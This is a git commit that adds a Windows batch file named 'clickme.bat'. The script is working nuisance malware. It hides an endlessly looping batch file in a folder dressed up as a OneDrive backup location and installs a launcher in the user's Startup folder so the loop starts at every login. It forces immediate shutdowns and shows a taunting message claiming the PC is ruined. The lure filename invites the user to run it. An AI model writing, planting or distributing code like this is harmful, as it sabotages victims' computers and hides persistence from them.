6500e5d0a2ec5e7347600f6af50383acae571088
JayKuoNoob <jaykuo1203@gmail.com>
2023-10-21 01:32:06 +0800

    commit

---
+++ clickme.bat
@@ -0,0 +1,37 @@
+:: clear files
+del /f "bye.bat"
+del /f "deadbutton.bat"
+del /f "bkShutdown.bat"
+
+::write spammed file
+echo MODE 1,1 > bye.bat
+echo @echo off >> bye.bat
+echo :loop >> bye.bat
+echo echo 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 >> bye.bat
+echo goto :loop >>bye.bat
+mkdir "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all"
+move "bye.bat" "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\"
+
+::write spam execute file
+echo @echo off > deadbutton.bat
+echo :loop >> deadbutton.bat
+echo "C:\ProgramData\Microsoft OneDrive\Backup\%USERNAME%\all\bye.bat" >> deadbutton.bat
+echo goto :loop >> deadbutton.bat
+move "deadbutton.bat" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+::backup shutdown
+echo MODE 1,1 > bkShutdown.bat
+echo @echo off >> bkShutdown.bat
+echo /t 12 > nul >> bkShutdown.bat
+shutdown /s /f /t 0 >> bkShutdown.bat
+move "bkShutdown.bat" "C:\ProgramData\Microsoft OneDrive\Backup\"
+"C:\ProgramData\Microsoft OneDrive\Backup\bkShutdown.bat"
+
+::say goodbye
+echo This is a bad news for you
+echo I'm sorry to say that
+echo Your PC, unfortunately has been ruined
+echo Terminating this cmd won't work tho......
+echo This is the last ten second......
+timeout /t 10 > nul
+shutdown /s /f /t 0
